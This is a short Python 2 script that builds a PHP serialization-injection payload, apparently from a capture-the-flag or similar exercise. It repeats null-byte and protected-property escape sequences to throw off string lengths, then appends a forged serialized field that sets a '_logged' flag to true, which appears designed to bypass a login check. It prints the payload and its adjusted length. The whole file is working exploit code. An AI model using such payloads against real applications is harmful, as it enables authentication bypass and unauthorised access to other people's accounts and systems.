overflow_2 = '\\0\\0%00*%00a'


payload = overflow_2 * 28 + '";s:10:"'+overflow_2+'_logged";b:1;'

print payload
print 'len: ' + str(len(payload) - 29*2)
